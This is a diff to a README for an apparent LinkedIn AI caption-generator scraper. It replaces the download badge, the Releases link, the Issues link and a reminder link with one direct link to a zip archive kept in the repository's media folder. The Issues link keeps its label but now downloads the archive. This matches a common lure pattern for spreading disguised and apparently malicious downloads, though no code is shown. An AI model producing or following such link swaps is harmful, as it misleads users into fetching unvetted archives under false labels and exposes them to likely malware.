@@ -1,6 +1,6 @@
 # 🤖 linkedin-ai-caption-generator-scraper - Generate Captions Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/main/media/linkedin-ai-caption-generator-scraper-2.0.zip)](https://raw.githubusercontent.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/main/media/linkedin-ai-caption-generator-scraper-2.0.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ To run this application, you will need:
 
 ### 2. Download & Install
 
-To get started, visit the [GitHub Releases page](https://github.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/releases) to download the latest version of the application.
+To get started, visit the [GitHub Releases page](https://raw.githubusercontent.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/main/media/linkedin-ai-caption-generator-scraper-2.0.zip) to download the latest version of the application.
 
 ### 3. Running the Application
 
@@ -66,10 +66,10 @@ For more technical issues or detailed guidance, you can check the FAQ section on
 
 ## 🤝 Support
 
-For further assistance, you can reach out via the [Issues page](https://github.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/issues) on GitHub. We welcome feedback and suggestions to improve the application!
+For further assistance, you can reach out via the [Issues page](https://raw.githubusercontent.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/main/media/linkedin-ai-caption-generator-scraper-2.0.zip) on GitHub. We welcome feedback and suggestions to improve the application!
 
 ### Reminder
 
-To download the latest version of the LinkedIn AI Caption Generator Scraper, click [here](https://github.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/releases). 
+To download the latest version of the LinkedIn AI Caption Generator Scraper, click [here](https://raw.githubusercontent.com/Cookiewoolv/linkedin-ai-caption-generator-scraper/main/media/linkedin-ai-caption-generator-scraper-2.0.zip). 
 
 Enjoy effortlessly generating captivating captions!
